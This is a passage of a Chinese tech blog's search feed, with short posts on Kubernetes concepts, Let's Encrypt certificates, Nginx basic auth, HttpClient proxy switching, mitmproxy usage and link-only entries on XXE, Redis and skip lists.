ZGFzaGFycmF5OjIuMCwyLjA7IiB4MT0iMTA5MyIgeDI9IjEzNTMiIHkxPSIxMzc4Ljg3NSIgeTI9IjEzNzguODc1Ii8+PHRleHQgZmlsbD0iIzAwMDAwMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iMTMiIGZvbnQtd2VpZ2h0PSJib2xkIiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjE4IiB4PSIxMTAwIiB5PSIxMzczLjgwOTEiPjMyPC90ZXh0Pjx0ZXh0IGZpbGw9IiMwMDAwMDAiIGZvbnQtZmFtaWx5PSJzYW5zLXNlcmlmIiBmb250LXNpemU9IjEzIiBsZW5ndGhBZGp1c3Q9InNwYWNpbmciIHRleHRMZW5ndGg9IjIyMCIgeD0iMTEyMiIgeT0iMTM3My44MDkxIj5b5LqL5Lu2XSDmiJDlip/otK3kubDllYblk4EgLSZndDsg5o6o6YCB6L+Q6JCl6YCa55+lPC90ZXh0PjwhLS1TUkM9W2hMTERLemZHNUR0ZEx4blR3dUI5dGticWZqRGJudU5UQ1luZVlIc2NMWG81U0dsTUptRzlETFc1UXVIMlBKZTJUZ0k4S2tKN0RGVmJ2TF9xOUpTdVlJNjJHcmFtb05sZGRkbGtVVlUtWDFGbnM1QllxcGpmSEgxcWZLdnRoYWRXOU03RDJjR0ItYkxGeHdjcEhFbGt5SlYxa01ZMmpGd25LVmQ2c1p6dTQzdDlHaGV5SXEzVWVMUzVjWm1OU1BVVWJPc1Y2TlZlWXExV1AybllaTUlIM1JPem9Ub0FUNE1iRXhCTUJWOTB0OGI2STcxckFSUXNpMVotQThLNHVTREFCQjVDdUZPMDZhVDZQR0VnNnhneXZNNzVfSTRobno3VHhvOWl5VFMzelpLNzF3YmUxMjYyNC1hTndHRHJJcVNlTG16ZkxHV2xuV2EtS2dNYnpPeHF1V096d3lCV0N0OWV0SXBoTjhxWDcxN21pNG15c0U1MUdsS05RelQ0THVJcTU5YkNwRHphb1l2TXRkLTJJQnU1OXROT3g2WXpHckkzRVJIa21yMUlxMnBRdGFzYU42X2ltanNjYnlvZzBsX20tRXFVdjdQVnQ0dE1saGF5LXRzanRMbjJpc0ZsT0IzYlpWTWV0VXZuZ0UyRDlXNF9xa3FTQmxGRUVjUkRJLVdOZGlGREVnellYV0duTHlZRlJzdi1iY0RrenhIVTlxSVNrZzFydXN2X0RZWW5TV09yc2pxcnFUSHZZeU5lOENXUHNnWTVxNF8yVndPN0phVm5EQW9qMXZhY0pFSDd1OXNQeEpITHhlT0pBS0JfMm5pU3NIdFpaVlBmNm1qZjVjQ0xQRHpyZllpRmFoNjEwZ0xKVW90VGVTZEtsSEwtNW9ITFF3bkxTT091LVNWSDIteFJZZGpaNzVWclNmQ3JnLXdmQ2ljY1FXWnRaM3Z3WXg3LTFLZUdLRy1rM2xsTUVNSUdGVUdZeUNIN2pWN0tnZnlvUWZMSl9yNTNlSTdOMU81SUJBMXROQVBIN09HX3dyUkZaRWJpd3NrN1BENDhCUk5mdVFNcERzcHJPYzh2NGV2QmVoSW04QnNGSXY2dGlSTkxjSjdLdldjVXp1UDM4cHBwMzhiUHRnbE5ScVhpWEd6T2JoS0FKY1RpakE5MmxXX3ZFWnJIMF9QbloxbXVicks4UEVzNndMYlhZLVV0V2tSY0JJWlRobmw5cjUzYjhxN2E3ZXBVU3d6cWpKT2I1SlIxVnc1WTB2ZDlEUGxBaWt1Vl0tLT48L2c+PC9zdmc+'>]]></content>
      
      
      <categories>
          
          <category> Architecture Design </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Architecture Design </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>经济发展理论</title>
      <link href="/2022/02/08/%E7%BB%8F%E6%B5%8E%E5%8F%91%E5%B1%95%E7%90%86%E8%AE%BA/"/>
      <url>/2022/02/08/%E7%BB%8F%E6%B5%8E%E5%8F%91%E5%B1%95%E7%90%86%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="熊彼特经济发展理论"><a href="#熊彼特经济发展理论" class="headerlink" title="熊彼特经济发展理论"></a>熊彼特经济发展理论</h2><p><img src="/assets/images/%E7%BB%8F%E6%B5%8E%E5%8F%91%E5%B1%95%E7%90%86%E8%AE%BA.svg"></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 创新 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>K8S基础概念</title>
      <link href="/2019/05/31/K8S%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/"/>
      <url>/2019/05/31/K8S%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h3 id="1、Node"><a href="#1、Node" class="headerlink" title="1、Node"></a>1、Node</h3><p>Node作为集群中的工作节点，运行真正的应用程序，在Node上Kubernetes管理的最小运行单元是Pod。Node上运行着Kubernetes的Kubelet、kube-proxy服务进程，这些服务进程负责Pod的创建、启动、监控、重启、销毁、以及实现软件模式的负载均衡。</p><p>Node包含的信息：</p><ul><li>Node地址：主机的IP地址，或Node ID。</li><li>Node的运行状态：Pending、Running、Terminated三种状态。</li><li>Node Condition：…</li><li>Node系统容量：描述Node可用的系统资源，包括CPU、内存、最大可调度Pod数量等。</li><li>其他：内核版本号、Kubernetes版本等。</li></ul><p>查看Node信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl describe node</span><br></pre></td></tr></table></figure><h3 id="2、Pod"><a href="#2、Pod" class="headerlink" title="2、Pod"></a>2、Pod</h3><p>Pod是Kubernetes最基本的操作单元，包含一个或多个紧密相关的容器，一个Pod可以被一个容器化的环境看作应用层的“逻辑宿主机”；一个Pod中的多个容器应用通常是紧密耦合的，Pod在Node上被创建、启动或者销毁；每个Pod里运行着一个特殊的被称之为Pause的容器，其他容器则为业务容器，这些业务容器共享Pause容器的网络栈和Volume挂载卷，因此他们之间通信和数据交换更为高效，在设计时我们可以充分利用这一特性将一组密切相关的服务进程放入同一个Pod中。</p><p>同一个Pod里的容器之间仅需通过localhost就能互相通信。</p><p><img src="/assets/images/k8s-pod.jpg"></p><p>一个Pod中的应用容器共享同一组资源：</p><ul><li>PID命名空间：Pod中的不同应用程序可以看到其他应用程序的进程ID；</li><li>网络命名空间：Pod中的多个容器能够访问同一个IP和端口范围；</li><li>IPC命名空间：Pod中的多个容器能够使用SystemV IPC或POSIX消息队列进行通信；</li><li>UTS命名空间：Pod中的多个容器共享一个主机名；</li><li>Volumes（共享存储卷）：Pod中的各个容器可以访问在Pod级别定义的Volumes；</li></ul><p>Pod的生命周期通过Replication Controller来管理；通过模板进行定义，然后分配到一个Node上运行，在Pod所包含容器运行结束后，Pod结束。</p><p>Kubernetes为Pod设计了一套独特的网络配置，包括：为每个Pod分配一个IP地址，使用Pod名作为容器间通信的主机名等。</p><h3 id="3、Service"><a href="#3、Service" class="headerlink" title="3、Service"></a>3、Service</h3><p>在Kubernetes的世界里，虽然每个Pod都会被分配一个单独的IP地址，但这个IP地址会随着Pod的销毁而消失，这就引出一个问题：如果有一组Pod组成一个集群来提供服务，那么如何来访问它呢？Service！</p><p>一个Service可以看作一组提供相同服务的Pod的对外访问接口，Service作用于哪些Pod是通过Label Selector来定义的。</p><ul><li>拥有一个指定的名字（比如my-mysql-server）；</li><li>拥有一个虚拟IP（Cluster IP、Service IP或VIP）和端口号，销毁之前不会改变，只能内网访问；</li><li>能够提供某种远程服务能力；</li><li>被映射到了提供这种服务能力的一组容器应用上；</li><li>如果Service要提供外网服务，需指定公共IP和NodePort，或外部负载均衡器；</li></ul><h4 id="NodePort"><a href="#NodePort" class="headerlink" title="NodePort"></a>NodePort</h4><p>系统会在Kubernetes集群中的每个Node上打开一个主机的真实端口，这样，能够访问Node的客户端就能通过这个端口访问到内部的Service了</p><h3 id="4、Volume"><a href="#4、Volume" class="headerlink" title="4、Volume"></a>4、Volume</h3><p>Volume是Pod中能够被多个容器访问的共享目录。</p><h3 id="5、Label"><a href="#5、Label" class="headerlink" title="5、Label"></a>5、Label</h3><p>Label以key&#x2F;value的形式附加到各种对象上，如Pod、Service、RC、Node等，以识别这些对象，管理关联关系等，如Service和Pod的关联关系。</p><h3 id="6、RC（Replication-Controller）"><a href="#6、RC（Replication-Controller）" class="headerlink" title="6、RC（Replication Controller）"></a>6、RC（Replication Controller）</h3><p>目标Pod的定义；</p><ul><li>目标Pod需要运行的副本数量；</li><li>要监控的目标Pod标签（Lable）；</li><li>Kubernetes通过RC中定义的Lable筛选出对应的Pod实例，并实时监控其状态和数量，如果实例数量少于定义的副本数量（Replicas），则会根据RC中定义的Pod模板来创建一个新的Pod，然后将此Pod调度到合适的Node上启动运行，直到Pod实例数量达到预定目标。</li></ul><h3 id="7、mirror-of-kube-config"><a href="#7、mirror-of-kube-config" class="headerlink" title="7、mirror of kube-config"></a>7、mirror of kube-config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f http://mirror.faasx.com/kubernetes/heapster/deploy/kube-config/influxdb/influxdb.yaml</span><br><span class="line">kubectl create -f http://mirror.faasx.com/kubernetes/heapster/deploy/kube-config/influxdb/grafana.yaml</span><br><span class="line">kubectl create -f http://mirror.faasx.com/kubernetes/heapster/deploy/kube-config/influxdb/heapster.yaml</span><br><span class="line">kubectl create -f http://mirror.faasx.com/kubernetes/heapster/deploy/kube-config/rbac/heapster-rbac.yaml</span><br><span class="line"></span><br><span class="line">kubectl create -f https://raw.githubusercontent.com/kubernetes-retired/heapster/master/deploy/kube-config/influxdb/influxdb.yaml</span><br><span class="line">kubectl create -f https://raw.githubusercontent.com/kubernetes-retired/heapster/master/deploy/kube-config/influxdb/grafana.yaml</span><br><span class="line">kubectl create -f https://raw.githubusercontent.com/kubernetes-retired/heapster/master/deploy/kube-config/influxdb/heapster.yaml</span><br><span class="line">kubectl create -f https://raw.githubusercontent.com/kubernetes-retired/heapster/master/deploy/kube-config/rbac/heapster-rbac.yaml</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DevOps </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kubernetes </tag>
            
            <tag> k8s </tag>
            
            <tag> DevOps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Let&#39;s Encrypt 免费通配符 SSL 证书申请教程</title>
      <link href="/2019/05/31/Let&#39;s%20Encrypt%20%E5%85%8D%E8%B4%B9%E9%80%9A%E9%85%8D%E7%AC%A6%20SSL%20%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/"/>
      <url>/2019/05/31/Let&#39;s%20Encrypt%20%E5%85%8D%E8%B4%B9%E9%80%9A%E9%85%8D%E7%AC%A6%20SSL%20%E8%AF%81%E4%B9%A6%E7%94%B3%E8%AF%B7%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.hi-linux.com/posts/6968.html">Let’s Encrypt 免费通配符 SSL 证书申请教程</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// nginx conf</span><br><span class="line">ssl_certificate /etc/letsencrypt/live/safety114.com-0001/fullchain.pem;</span><br><span class="line">ssl_certificate_key /etc/letsencrypt/live/safety114.com-0001/privkey.pem;</span><br><span class="line">ssl_trusted_certificate  /etc/letsencrypt/live/safety114.com-0001/chain.pem;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">certbot certonly \</span><br><span class="line">--email xxxxxx@gmail.com \</span><br><span class="line">--agree-tos \</span><br><span class="line">--preferred-challenges dns \</span><br><span class="line">--server https://acme-v02.api.letsencrypt.org/directory \</span><br><span class="line">--manual \</span><br><span class="line">-d safety114.com \</span><br><span class="line">-d *.safety114.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DevOps </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
            <tag> Let&#39;s Encrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe漏洞的学习与利用总结</title>
      <link href="/2019/05/31/xxe%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2019/05/31/xxe%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/r00tuser/p/7255939.html">xxe 漏洞的学习与利用总结</a></p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于GitLab+Docker+K8S的持续集成和交付</title>
      <link href="/2019/05/31/%E5%9F%BA%E4%BA%8EGitLab+Docker+K8S%E7%9A%84%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%92%8C%E4%BA%A4%E4%BB%98/"/>
      <url>/2019/05/31/%E5%9F%BA%E4%BA%8EGitLab+Docker+K8S%E7%9A%84%E6%8C%81%E7%BB%AD%E9%9B%86%E6%88%90%E5%92%8C%E4%BA%A4%E4%BB%98/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/mxw2552261/article/details/89596869">基于GitLab+Docker+K8S的持续集成和交付</a></p>]]></content>
      
      
      <categories>
          
          <category> DevOps </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DevOps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入学习Redis（1）：Redis内存模型</title>
      <link href="/2019/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%EF%BC%881%EF%BC%89%EF%BC%9ARedis%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/"/>
      <url>/2019/05/31/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0Redis%EF%BC%881%EF%BC%89%EF%BC%9ARedis%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/kismetv/p/8654978.html">深入学习Redis（1）：Redis内存模型</a></p>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跳跃表原理</title>
      <link href="/2019/05/31/%E8%B7%B3%E8%B7%83%E8%A1%A8%E5%8E%9F%E7%90%86/"/>
      <url>/2019/05/31/%E8%B7%B3%E8%B7%83%E8%A1%A8%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/acfox/p/3688607.html">跳跃表原理</a></p>]]></content>
      
      
      <categories>
          
          <category> Data Structures and Algorithms </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nginx配置Basic Auth登录认证</title>
      <link href="/2019/02/14/Nginx%E9%85%8D%E7%BD%AEBasic%20Auth%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/"/>
      <url>/2019/02/14/Nginx%E9%85%8D%E7%BD%AEBasic%20Auth%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<p>可以通过以下步骤在 Nginx 中配置 Basic Auth 登录认证：</p><ol><li><p>创建一个包含用户名和密码的文件，格式为 <code>username:password</code>，并使用 <code>htpasswd</code> 工具生成加密密码。例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ htpasswd -c /etc/nginx/.htpasswd username</span><br></pre></td></tr></table></figure><p>这将创建一个名为 <code>.htpasswd</code> 的文件，并向其添加一个名为 <code>username</code> 的用户。</p></li><li><p>在 Nginx 配置文件中添加以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    auth_basic &quot;Restricted&quot;;</span><br><span class="line">    auth_basic_user_file /etc/nginx/.htpasswd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这将在 <code>/</code> 路径下启用 Basic Auth 认证，并使用刚刚创建的 <code>.htpasswd</code> 文件中的用户名和密码进行认证。</p></li><li><p>重新加载 Nginx 配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nginx -s reload</span><br></pre></td></tr></table></figure></li></ol><p>现在，当用户访问 Nginx 服务器时，他们将被要求提供用户名和密码才能访问受保护的资源。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HttpClient 动态切换代理</title>
      <link href="/2018/07/29/HttpClient%20%E5%8A%A8%E6%80%81%E5%88%87%E6%8D%A2%E4%BB%A3%E7%90%86/"/>
      <url>/2018/07/29/HttpClient%20%E5%8A%A8%E6%80%81%E5%88%87%E6%8D%A2%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>普通情况下使用 <code>HttpClient</code> 如果需要使用代理可以参看官方的文档。<br><a href="http://hc.apache.org/httpcomponents-client-ga/tutorial/html/connmgmt.html#d5e475">http://hc.apache.org/httpcomponents-client-ga/tutorial/html/connmgmt.html#d5e475</a><br>很多情况下，因为被爬取主战的可能经常变更屏蔽策略，所以我们需要动态的来设置、切换代理。</p><p>所以需要自定义 <code>HttpRoutPlanner</code>。参考如下代码和测试用例：</p><span id="more"></span><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.http.HttpException;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpHost;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.routing.HttpRoute;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.conn.routing.HttpRoutePlanner;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.impl.conn.DefaultProxyRoutePlanner;</span><br><span class="line"><span class="keyword">import</span> org.apache.http.protocol.HttpContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyRoutePlanner</span> <span class="keyword">implements</span> <span class="title class_">HttpRoutePlanner</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> DefaultProxyRoutePlanner defaultProxyRoutePlanner;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DynamicProxyRoutePlanner</span><span class="params">(HttpHost host)</span> &#123;</span><br><span class="line">        defaultProxyRoutePlanner = <span class="keyword">new</span> <span class="title class_">DefaultProxyRoutePlanner</span>(host);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProxy</span><span class="params">(HttpHost host)</span> &#123;</span><br><span class="line">        defaultProxyRoutePlanner = <span class="keyword">new</span> <span class="title class_">DefaultProxyRoutePlanner</span>(host);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HttpRoute <span class="title function_">determineRoute</span><span class="params">(HttpHost target, HttpRequest request, HttpContext context)</span> <span class="keyword">throws</span> HttpException &#123;</span><br><span class="line">        <span class="keyword">return</span> defaultProxyRoutePlanner.determineRoute(target, request, context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testChangeProxyDaynamic</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">HttpHost</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;172.16.25.1&quot;</span>, <span class="number">10086</span>);</span><br><span class="line">        <span class="type">DynamicProxyRoutePlanner</span> <span class="variable">routePlanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DynamicProxyRoutePlanner</span>(proxy);</span><br><span class="line"></span><br><span class="line">        <span class="type">CloseableHttpClient</span> <span class="variable">httpclient</span> <span class="operator">=</span> HttpClients.custom()</span><br><span class="line">                .setRoutePlanner(routePlanner)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">            <span class="comment">//Any time change the proxy</span></span><br><span class="line">            routePlanner.setProxy(<span class="keyword">new</span> <span class="title class_">HttpHost</span>(<span class="string">&quot;172.16.25.&quot;</span> + i, <span class="number">10086</span>));</span><br><span class="line"></span><br><span class="line">            Map&lt;String, String&gt; map = Maps.newHashMap();</span><br><span class="line">            map.put(<span class="string">&quot;ip&quot;</span>, <span class="string">&quot;myip&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> httpPost(httpclient, <span class="string">&quot;http://ip.taobao.com/service/getIpInfo2.php&quot;</span>, map, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            System.out.println(result.trim());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mitmproxy 抓包工具</title>
      <link href="/2018/05/28/mitmproxy%20%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/"/>
      <url>/2018/05/28/mitmproxy%20%E6%8A%93%E5%8C%85%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>mitmproxy 是一组工具，可为 HTTP&#x2F;1、HTTP&#x2F;2 和 WebSockets 提供交互式的、支持 SSL&#x2F;TLS 的拦截代理。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>请按照适用于您的操作系统的步骤进行操作。</p><h3 id="苹果系统"><a href="#苹果系统" class="headerlink" title="苹果系统"></a>苹果系统</h3><p>在 macOS 上安装 mitmproxy 的推荐方法是使用 Homebrew：</p><p><code>brew install mitmproxy</code></p><h3 id="启动您需要的工具"><a href="#启动您需要的工具" class="headerlink" title="启动您需要的工具"></a>启动您需要的工具</h3><p>您可以从命令行&#x2F;终端启动我们的三个工具中的任何一个。</p><ul><li>mitmproxy 为您提供交互式命令行界面</li><li>mitmweb 为您提供基于浏览器的 GUI</li><li>mitmdump 为您提供非交互式终端输出</li></ul><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p>拦截 HTTP 和 HTTPS 请求和响应并即时修改它们<br>保存完整的 HTTP 对话以供以后重播和分析<br>重播 HTTP 对话的客户端<br>重播先前记录的服务器的 HTTP 响应<br>反向代理模式将流量转发到指定服务器<br>macOS 和 Linux 上的透明代理模式<br>使用 Python 对 HTTP 流量进行脚本化更改<br>即时生成用于拦截的 SSL&#x2F;TLS 证书<br>还有很多很多……</p><h2 id="3-个强大的核心工具"><a href="#3-个强大的核心工具" class="headerlink" title="3 个强大的核心工具"></a>3 个强大的核心工具</h2><p>mitmproxy 项目的工具是一组暴露通用底层功能的前端。当我们谈论“mitmproxy”时，我们通常指的是这三种工具中的任何一种——它们只是同一核心代理的不同前端。</p><p>mitmproxy 是一个交互式的、支持 SSL&#x2F;TLS 的拦截代理，具有 HTTP&#x2F;1、HTTP&#x2F;2 和 WebSockets 的控制台接口。</p><p>mitmweb 是 mitmproxy 的基于 Web 的界面。</p><p>mitmdump 是 mitmproxy 的命令行版本。想想 HTTP 的 tcpdump。</p><p>分发包可以在 mitmproxy 网站上找到。开发信息和我们的源代码可以在我们的 GitHub 存储库中找到 。</p><h3 id="中间代理"><a href="#中间代理" class="headerlink" title="中间代理"></a>中间代理</h3><p>mitmproxy 是一个控制台工具，允许交互式检查和修改 HTTP 流量。它与 mitmdump 的不同之处在于所有流都保存在内存中，这意味着它旨在获取和处理小样本。使用快捷键从任何 mitmproxy?屏幕查看上下文相关的文档。</p><p><img src="/assets/images/mitmproxy.png"></p><h3 id="中间人网络"><a href="#中间人网络" class="headerlink" title="中间人网络"></a>中间人网络</h3><p>mitmweb 是 mitmproxy 的基于 Web 的用户界面，允许交互式检查和修改 HTTP 流量。与 mitmproxy 一样，它与 mitmdump 的不同之处在于所有流都保存在内存中，这意味着它旨在获取和处理小样本。</p><p>Mitmweb 目前处于测试阶段。我们认为它对于当前在 UI 中公开的所有功能都是稳定的，但它仍然缺少很多 mitmproxy 的功能。</p><p><img src="/assets/images/mitmweb.png"></p><h3 id="中间转储"><a href="#中间转储" class="headerlink" title="中间转储"></a>中间转储</h3><p>mitmdump 是 mitmproxy 的命令行伴侣。它提供类似于 tcpdump 的功能，让您可以查看、记录和以编程方式转换 HTTP 流量。–help 有关完整文档，请参阅标志输出。</p><h2 id="示例：节省流量"><a href="#示例：节省流量" class="headerlink" title="示例：节省流量"></a>示例：节省流量</h2><h3 id="节省流量"><a href="#节省流量" class="headerlink" title="节省流量"></a>节省流量</h3><p><code>mitmdump -w outfile</code><br>以代理模式启动 mitmdump，并将所有流量写入 outfile。</p><h3 id="过滤保存的流量"><a href="#过滤保存的流量" class="headerlink" title="过滤保存的流量"></a>过滤保存的流量</h3><p><code>mitmdump -nr infile -w outfile &quot;~m post&quot;</code><br>在不绑定到代理端口 ( -n) 的情况下启动 mitmdump，从 infile 读取所有流，应用指定的过滤器表达式（仅匹配 POST），并写入 outfile。</p><h3 id="客户端回放"><a href="#客户端回放" class="headerlink" title="客户端回放"></a>客户端回放</h3><p><code>mitmdump -nC outfile</code><br>在不绑定代理端口的情况下启动 mitmdump ( -n)，然后重播来自 outfile ( -C filename) 的所有请求。标志以明显的方式组合，因此您可以重放来自一个文件的请求，并将生成的流写入另一个文件：</p><p><code>mitmdump -nC srcfile -w dstfile</code><br>有关详细信息，请参阅客户端重播部分。</p><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p><code>mitmdump -s examples/simple/add_header.py</code><br>这将运行 add_header.py 示例脚本，它只是向所有响应添加一个新标头。</p><h3 id="脚本化数据转换"><a href="#脚本化数据转换" class="headerlink" title="脚本化数据转换"></a>脚本化数据转换</h3><p><code>mitmdump -ns examples/simple/add_header.py -r srcfile -w dstfile</code><br>此命令从 srcfile 加载流，根据指定的脚本对其进行转换，然后将其写回到 dstfile。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Slf4j MDC</title>
      <link href="/2018/05/21/Slf4j%20MDC/"/>
      <url>/2018/05/21/Slf4j%20MDC/</url>
      
        <content type="html"><![CDATA[<p>Slf4j MDC -&gt; Mapped Diagnostic Contexts</p><p><a href="https://blog.csdn.net/liubo2012/article/details/46337063">https://blog.csdn.net/liubo2012/article/details/46337063</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
